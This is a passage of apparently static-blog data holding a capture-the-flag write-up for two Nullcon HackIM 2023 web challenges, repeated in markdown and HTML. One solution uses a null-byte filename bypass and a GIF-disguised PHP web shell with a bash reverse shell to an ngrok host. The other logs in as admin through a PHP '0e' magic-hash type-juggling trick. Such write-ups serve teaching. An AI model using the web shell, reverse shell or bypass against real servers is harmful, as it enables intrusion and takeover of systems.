Flag</h2><p>Hence after running the script we get the flag</p>\n<p><img src=\"/./images/corctf23/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>corctf{S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;K&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S}</strong></p>\n<p>Thank You</p>\n"},{"title":"Nullcon Goa HackIM CTF 2023","_content":"\n# Nullcon Goa HackIM CTF 2023\n\n# Web/Magic Cars\n\n## Challenge Overview\n\nDescription: Who doesn't love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath\n\n![Index](./images/nullcon/magic/index.png)\n\nWe have been given a website [http://52.59.124.14:10021/](http://52.59.124.14:10021/). We can see three options there. But only gallery seems to be interesting.\n\nSo first let's see the source code given.\n\n```php\n<?php\nerror_reporting(0);\n\n$files = $_FILES[\"fileToUpload\"];\n$uploadOk = true;\n\nif ($files[\"name\"] != \"\") {\n    $target_dir = urldecode(\"images/\" . $files[\"name\"]);\n\n    if (strpos($target_dir, \"..\") !== false) {\n        $uploadOk = false;\n    }\n\n    if (filesize($files[\"tmp_name\"]) > 1 * 1000) {\n        $uploadOk = false;\n        echo \"Too big!!!\";\n    }\n\n    $extension = strtolower(pathinfo($target_dir, PATHINFO_EXTENSION));\n    $finfo = finfo_open(FILEINFO_MIME_TYPE);\n    $type = finfo_file($finfo, $files[\"tmp_name\"]);\n    finfo_close($finfo);\n\n    if ($extension != \"gif\" || strpos($type, \"image/gif\") === false) {\n        echo \" Sorry, only gif files are accepted\";\n        $uploadOk = false;\n    }\n\n    $target_dir = strtok($target_dir, chr(0));\n\n    if ($uploadOk && move_uploaded_file($files[\"tmp_name\"], $target_dir)) {\n        echo \"<a href='$target_dir'>Uploaded gif here. Go see it!</a>\";\n    }\n}\n?>\n```\n\n\n## Vulnerability Identification\n\nAs we can see the code is checking MIME type when we upload a gif. This leads to file upload vulnerability.\n\nSo adding gif header in the file the server can be easily exploited\n\n[Reference](https://book.hacktricks.xyz/pentesting-web/file-upload)\n\n\n## Exploiting the Vulnerability\n\nSo to exploit this we will set the header of the file to **GIF89a**. And then we will inject some php code to exploit the server.\n\nWe will name this file as `exploit.php%00.gif`. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.\n\nSo to exploit this server we will try to get a shell using **ngrok**\n\n`exploit.php%00.gif` looks like:\n\n```php\nGIF89a\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16344 0>&1'\");?>\n```\n\n## Obtaining the Flag\n\nTo retrieve the flag, we will use ngrok to get reverse shell.\n\nAfter uploading the file when we open it we get the shell.\n\nThe flag is located in `/var/www/html` and is named **flag.flag**.\n\n![Flag](./images/nullcon/magic/flag.png) \n\nFlag: **ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}**\n\n# Web/TYPicalBoss\n\n## Challenge Overview\n\nDescription: My boss just implemented his first PHP website. He mentioned that he managed to calculate a hash that is equal to 0??? I suppose he is not very experienced in PHP yet.\nAuthor: @moaath\n\n![Index](./images/nullcon/typicalboss/index.png)\n\nWe have been given a website [http://52.59.124.14:10022/index.php](http://52.59.124.14:10022/index.php). The website includes a basic login page at the route `login.php`, which takes username and password as input.\n\nWhen we access the main directory '/' of the website, we can see some files:\n\n![Main Directory](./images/nullcon/typicalboss/main.png)\n\nThe file that catches our interest is `database.db`. If we open it with a database browser, we can see a list of usernames and their corresponding hashed passwords:\n\n![Database](./images/nullcon/typicalboss/database.png)\n\n## Vulnerability Identification\n\nAs we observe the hashed passwords, we notice that password of admin starts with '0e'. This is a common vulnerability in PHP, where the hashed password is interpreted as 0 instead of the actual hash value '0e12345678912345678920202020202020202020'.\n\n## Exploiting the Vulnerability\n\nTo exploit this vulnerability, we need to find a value whose SHA-1 hash starts with '0e'. One common technique for this is known as Type Juggling. More details about this technique can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md).\n\nFor instance, the SHA-1 hash of '10932435112' starts with '0e', so in PHP, it will be interpreted as 0.\n\n## Obtaining the Flag\n\nTo retrieve the flag, we need to log in with the username 'admin' and the password '10932435112':\n\nUsername: admin\nPassword: 10932435112\n\nFlag: **ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}**\n\n![Flag](./images/nullcon/typicalboss/flag.png)\n\nThank You\n","source":"_posts/Nullcon_Goa_HackIM_CTF23_Writeup.md","raw":"---\ntitle: Nullcon Goa HackIM CTF 2023\n---\n\n# Nullcon Goa HackIM CTF 2023\n\n# Web/Magic Cars\n\n## Challenge Overview\n\nDescription: Who doesn't love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath\n\n![Index](./images/nullcon/magic/index.png)\n\nWe have been given a website [http://52.59.124.14:10021/](http://52.59.124.14:10021/). We can see three options there. But only gallery seems to be interesting.\n\nSo first let's see the source code given.\n\n```php\n<?php\nerror_reporting(0);\n\n$files = $_FILES[\"fileToUpload\"];\n$uploadOk = true;\n\nif ($files[\"name\"] != \"\") {\n    $target_dir = urldecode(\"images/\" . $files[\"name\"]);\n\n    if (strpos($target_dir, \"..\") !== false) {\n        $uploadOk = false;\n    }\n\n    if (filesize($files[\"tmp_name\"]) > 1 * 1000) {\n        $uploadOk = false;\n        echo \"Too big!!!\";\n    }\n\n    $extension = strtolower(pathinfo($target_dir, PATHINFO_EXTENSION));\n    $finfo = finfo_open(FILEINFO_MIME_TYPE);\n    $type = finfo_file($finfo, $files[\"tmp_name\"]);\n    finfo_close($finfo);\n\n    if ($extension != \"gif\" || strpos($type, \"image/gif\") === false) {\n        echo \" Sorry, only gif files are accepted\";\n        $uploadOk = false;\n    }\n\n    $target_dir = strtok($target_dir, chr(0));\n\n    if ($uploadOk && move_uploaded_file($files[\"tmp_name\"], $target_dir)) {\n        echo \"<a href='$target_dir'>Uploaded gif here. Go see it!</a>\";\n    }\n}\n?>\n```\n\n\n## Vulnerability Identification\n\nAs we can see the code is checking MIME type when we upload a gif. This leads to file upload vulnerability.\n\nSo adding gif header in the file the server can be easily exploited\n\n[Reference](https://book.hacktricks.xyz/pentesting-web/file-upload)\n\n\n## Exploiting the Vulnerability\n\nSo to exploit this we will set the header of the file to **GIF89a**. And then we will inject some php code to exploit the server.\n\nWe will name this file as `exploit.php%00.gif`. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.\n\nSo to exploit this server we will try to get a shell using **ngrok**\n\n`exploit.php%00.gif` looks like:\n\n```php\nGIF89a\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16344 0>&1'\");?>\n```\n\n## Obtaining the Flag\n\nTo retrieve the flag, we will use ngrok to get reverse shell.\n\nAfter uploading the file when we open it we get the shell.\n\nThe flag is located in `/var/www/html` and is named **flag.flag**.\n\n![Flag](./images/nullcon/magic/flag.png) \n\nFlag: **ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}**\n\n# Web/TYPicalBoss\n\n## Challenge Overview\n\nDescription: My boss just implemented his first PHP website. He mentioned that he managed to calculate a hash that is equal to 0??? I suppose he is not very experienced in PHP yet.\nAuthor: @moaath\n\n![Index](./images/nullcon/typicalboss/index.png)\n\nWe have been given a website [http://52.59.124.14:10022/index.php](http://52.59.124.14:10022/index.php). The website includes a basic login page at the route `login.php`, which takes username and password as input.\n\nWhen we access the main directory '/' of the website, we can see some files:\n\n![Main Directory](./images/nullcon/typicalboss/main.png)\n\nThe file that catches our interest is `database.db`. If we open it with a database browser, we can see a list of usernames and their corresponding hashed passwords:\n\n![Database](./images/nullcon/typicalboss/database.png)\n\n## Vulnerability Identification\n\nAs we observe the hashed passwords, we notice that password of admin starts with '0e'. This is a common vulnerability in PHP, where the hashed password is interpreted as 0 instead of the actual hash value '0e12345678912345678920202020202020202020'.\n\n## Exploiting the Vulnerability\n\nTo exploit this vulnerability, we need to find a value whose SHA-1 hash starts with '0e'. One common technique for this is known as Type Juggling. More details about this technique can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md).\n\nFor instance, the SHA-1 hash of '10932435112' starts with '0e', so in PHP, it will be interpreted as 0.\n\n## Obtaining the Flag\n\nTo retrieve the flag, we need to log in with the username 'admin' and the password '10932435112':\n\nUsername: admin\nPassword: 10932435112\n\nFlag: **ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}**\n\n![Flag](./images/nullcon/typicalboss/flag.png)\n\nThank You\n","slug":"Nullcon_Goa_HackIM_CTF23_Writeup","published":1,"date":"2024-05-14T10:20:19.793Z","updated":"2024-05-14T10:20:19.793Z","comments":1,"layout":"post","photos":[],"_id":"clw6937yz0003mnid6bhndjwd","content":"<h1 id=\"Nullcon-Goa-HackIM-CTF-2023\"><a href=\"#Nullcon-Goa-HackIM-CTF-2023\" class=\"headerlink\" title=\"Nullcon Goa HackIM CTF 2023\"></a>Nullcon Goa HackIM CTF 2023</h1><h1 id=\"Web-Magic-Cars\"><a href=\"#Web-Magic-Cars\" class=\"headerlink\" title=\"Web&#x2F;Magic Cars\"></a>Web&#x2F;Magic Cars</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: Who doesn’t love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath</p>\n<p><img src=\"/./images/nullcon/magic/index.png\" alt=\"Index\"></p>\n<p>We have been given a website <a href=\"http://52.59.124.14:10021/\">http://52.59.124.14:10021/</a>. We can see three options there. But only gallery seems to be interesting.</p>\n<p>So first let’s see the source code given.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$files</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;fileToUpload&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$uploadOk</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$files</span>[<span class=\"string\">&quot;name&quot;</span>] != <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$target_dir</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"string\">&quot;images/&quot;</span> . <span class=\"variable\">$files</span>[<span class=\"string\">&quot;name&quot;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$target_dir</span>, <span class=\"string\">&quot;..&quot;</span>) !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$uploadOk</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">filesize</span>(<span class=\"variable\">$files</span>[<span class=\"string\">&quot;tmp_name&quot;</span>]) &gt; <span class=\"number\">1</span> * <span class=\"number\">1000</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$uploadOk</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Too big!!!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$extension</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$target_dir</span>, PATHINFO_EXTENSION));</span><br><span class=\"line\">    <span class=\"variable\">$finfo</span> = <span class=\"title function_ invoke__\">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class=\"line\">    <span class=\"variable\">$type</span> = <span class=\"title function_ invoke__\">finfo_file</span>(<span class=\"variable\">$finfo</span>, <span class=\"variable\">$files</span>[<span class=\"string\">&quot;tmp_name&quot;</span>]);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">finfo_close</span>(<span class=\"variable\">$finfo</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$extension</span> != <span class=\"string\">&quot;gif&quot;</span> || <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$type</span>, <span class=\"string\">&quot;image/gif&quot;</span>) === <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot; Sorry, only gif files are accepted&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$uploadOk</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_dir</span> = <span class=\"title function_ invoke__\">strtok</span>(<span class=\"variable\">$target_dir</span>, <span class=\"title function_ invoke__\">chr</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$uploadOk</span> &amp;&amp; <span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$files</span>[<span class=\"string\">&quot;tmp_name&quot;</span>], <span class=\"variable\">$target_dir</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;a href=&#x27;<span class=\"subst\">$target_dir</span>&#x27;&gt;Uploaded gif here. Go see it!&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>As we can see the code is checking MIME type when we upload a gif. This leads to file upload vulnerability.</p>\n<p>So adding gif header in the file the server can be easily exploited</p>\n<p><a href=\"https://book.hacktricks.xyz/pentesting-web/file-upload\">Reference</a></p>\n<h2 id=\"Exploiting-the-Vulnerability\"><a href=\"#Exploiting-the-Vulnerability\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>So to exploit this we will set the header of the file to <strong>GIF89a</strong>. And then we will inject some php code to exploit the server.</p>\n<p>We will name this file as <code>exploit.php%00.gif</code>. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.</p>\n<p>So to exploit this server we will try to get a shell using <strong>ngrok</strong></p>\n<p><code>exploit.php%00.gif</code> looks like:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/0.tcp.in.ngrok.io/16344 0&gt;&amp;1&#x27;&quot;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>To retrieve the flag, we will use ngrok to get reverse shell.</p>\n<p>After uploading the file when we open it we get the shell.</p>\n<p>The flag is located in <code>/var/www/html</code> and is named <strong>flag.flag</strong>.</p>\n<p><img src=\"/./images/nullcon/magic/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}</strong></p>\n<h1 id=\"Web-TYPicalBoss\"><a href=\"#Web-TYPicalBoss\" class=\"headerlink\" title=\"Web&#x2F;TYPicalBoss\"></a>Web&#x2F;TYPicalBoss</h1><h2 id=\"Challenge-Overview-1\"><a href=\"#Challenge-Overview-1\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: My boss just implemented his first PHP website. He mentioned that he managed to calculate a hash that is equal to 0??? I suppose he is not very experienced in PHP yet.<br>Author: @moaath</p>\n<p><img src=\"/./images/nullcon/typicalboss/index.png\" alt=\"Index\"></p>\n<p>We have been given a website <a href=\"http://52.59.124.14:10022/index.php\">http://52.59.124.14:10022/index.php</a>. The website includes a basic login page at the route <code>login.php</code>, which takes username and password as input.</p>\n<p>When we access the main directory ‘&#x2F;‘ of the website, we can see some files:</p>\n<p><img src=\"/./images/nullcon/typicalboss/main.png\" alt=\"Main Directory\"></p>\n<p>The file that catches our interest is <code>database.db</code>. If we open it with a database browser, we can see a list of usernames and their corresponding hashed passwords:</p>\n<p><img src=\"/./images/nullcon/typicalboss/database.png\" alt=\"Database\"></p>\n<h2 id=\"Vulnerability-Identification-1\"><a href=\"#Vulnerability-Identification-1\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>As we observe the hashed passwords, we notice that password of admin starts with ‘0e’. This is a common vulnerability in PHP, where the hashed password is interpreted as 0 instead of the actual hash value ‘0e12345678912345678920202020202020202020’.</p>\n<h2 id=\"Exploiting-the-Vulnerability-1\"><a href=\"#Exploiting-the-Vulnerability-1\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>To exploit this vulnerability, we need to find a value whose SHA-1 hash starts with ‘0e’. One common technique for this is known as Type Juggling. More details about this technique can be found <a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md\">here</a>.</p>\n<p>For instance, the SHA-1 hash of ‘10932435112’ starts with ‘0e’, so in PHP, it will be interpreted as 0.</p>\n<h2 id=\"Obtaining-the-Flag-1\"><a href=\"#Obtaining-the-Flag-1\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>To retrieve the flag, we need to log in with the username ‘admin’ and the password ‘10932435112’:</p>\n<p>Username: admin<br>Password: 10932435112</p>\n<p>Flag: <strong>ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}</strong></p>\n<p><img src=\"/./images/nullcon/typicalboss/flag.png\" alt=\"Flag\"></p>\n<p>Thank You</p>\n","excerpt":"","more":"<h1 id=\"Nullcon-Goa-HackIM-CTF-2023\"><a href=\"#Nullcon-Goa-HackIM-CTF-2023\" class=\"headerlink\" title=\"Nullcon Goa HackIM CTF 2023\"></a>Nullcon Goa HackIM CTF 2023</h1><h1 id=\"Web-Magic-Cars\"><a href=\"#Web-Magic-Cars\" class=\"headerlink\" title=\"Web&#x2F;Magic Cars\"></a>Web&#x2F;Magic Cars</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: Who doesn’t love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath</p>\n<p><img src=\"/./images/nullcon/magic/index.png\" alt=\"Index\"></p>\n<p>We have been given a website <a href=\"http://52.59.124.14:10021/\">http://52.59.124.14:10021/</a>. We can see three options there. But only gallery seems to be interesting.</p>\n<p>So first let’s see the source code given.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$files</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;fileToUpload&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$uploadOk</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$files</span>[<span class=\"string\">&quot;name&quot;</span>] != <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$target_dir</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"string\">&quot;images/&quot;</span> . <span class=\"variable\">$files</span>[<span class=\"string\">&quot;name&quot;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$target_dir</span>, <span class=\"string\">&quot;..&quot;</span>) !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$uploadOk</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">filesize</span>(<span class=\"variable\">$files</span>[<span class=\"string\">&quot;tmp_name&quot;</span>]) &gt; <span class=\"number\">1</span> * <span class=\"number\">1000</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$uploadOk</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Too big!!!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$extension</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$target_dir</span>, PATHINFO_EXTENSION));</span><br><span class=\"line\">    <span class=\"variable\">$finfo</span> = <span class=\"title function_ invoke__\">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class=\"line\">    <span class=\"variable\">$type</span> = <span class=\"title function_ invoke__\">finfo_file</span>(<span class=\"variable\">$finfo</span>, <span class=\"variable\">$files</span>[<span class=\"string\">&quot;tmp_name&quot;</span>]);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">finfo_close</span>(<span class=\"variable\">$finfo</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$extension</span> != <span class=\"string\">&quot;gif&quot;</span> || <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$type</span>, <span class=\"string\">&quot;image/gif&quot;</span>) === <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot; Sorry, only gif files are accepted&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$uploadOk</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_dir</span> = <span class=\"title function_ invoke__\">strtok</span>(<span class=\"variable\">$target_dir</span>, <span class=\"title function_ invoke__\">chr</span>(<span class=\"number\">0</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$uploadOk</span> &amp;&amp; <span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$files</span>[<span class=\"string\">&quot;tmp_name&quot;</span>], <span class=\"variable\">$target_dir</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;a href=&#x27;<span class=\"subst\">$target_dir</span>&#x27;&gt;Uploaded gif here. Go see it!&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>As we can see the code is checking MIME type when we upload a gif. This leads to file upload vulnerability.</p>\n<p>So adding gif header in the file the server can be easily exploited</p>\n<p><a href=\"https://book.hacktricks.xyz/pentesting-web/file-upload\">Reference</a></p>\n<h2 id=\"Exploiting-the-Vulnerability\"><a href=\"#Exploiting-the-Vulnerability\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>So to exploit this we will set the header of the file to <strong>GIF89a</strong>. And then we will inject some php code to exploit the server.</p>\n<p>We will name this file as <code>exploit.php%00.gif</code>. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.</p>\n<p>So to exploit this server we will try to get a shell using <strong>ngrok</strong></p>\n<p><code>exploit.php%00.gif</code> looks like:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/0.tcp.in.ngrok.io/16344 0&gt;&amp;1&#x27;&quot;</span>);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>To retrieve the flag, we will use ngrok to get reverse shell.</p>\n<p>After uploading the file when we open it we get the shell.</p>\n<p>The flag is located in <code>/var/www/html</code> and is named <strong>flag.flag</strong>.</p>\n<p><img src=\"/./images/nullcon/magic/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}</strong></p>\n<h1 id=\"Web-TYPicalBoss\"><a href=\"#Web-TYPicalBoss\" class=\"headerlink\" title=\"Web&#x2F;TYPicalBoss\"></a>Web&#x2F;TYPicalBoss</h1><h2 id=\"Challenge-Overview-1\"><a href=\"#Challenge-Overview-1\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: My boss just implemented his first PHP website. He mentioned that he managed to calculate a hash that is equal to 0??? I suppose he is not very experienced in PHP yet.<br>Author: @moaath</p>\n<p><img src=\"/./images/nullcon/typicalboss/index.png\" alt=\"Index\"></p>\n<p>We have been given a website <a href=\"http://52.59.124.14:10022/index.php\">http://52.59.124.14:10022/index.php</a>. The website includes a basic login page at the route <code>login.php</code>, which takes username and password as input.</p>\n<p>When we access the main directory ‘&#x2F;‘ of the website, we can see some files:</p>\n<p><img src=\"/./images/nullcon/typicalboss/main.png\" alt=\"Main Directory\"></p>\n<p>The file that catches our interest is <code>database.db</code>. If we open it with a database browser, we can see a list of usernames and their corresponding hashed passwords:</p>\n<p><img src=\"/./images/nullcon/typicalboss/database.png\" alt=\"Database\"></p>\n<h2 